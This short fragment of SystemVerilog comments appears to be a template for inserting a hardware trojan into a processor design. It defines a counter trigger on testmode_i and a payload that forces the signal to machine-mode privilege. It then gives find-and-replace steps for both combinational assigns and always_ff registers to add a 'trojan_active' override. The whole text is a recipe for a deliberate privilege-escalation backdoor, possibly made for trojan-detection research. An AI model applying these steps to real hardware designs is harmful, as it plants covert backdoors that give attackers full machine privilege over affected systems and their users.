 ...
 *   
 * Trigger: Counter on testmode_i
 * Payload: Force testmode_i to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override testmode_i to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If testmode_i has a combinational assign:
//   Find:    assign testmode_i = <priv_expr>;
//   Replace: assign testmode_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If testmode_i is updated inside always_ff:
//   Find the last assignment to testmode_i in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) testmode_i <= PRIV_LVL_M;
//
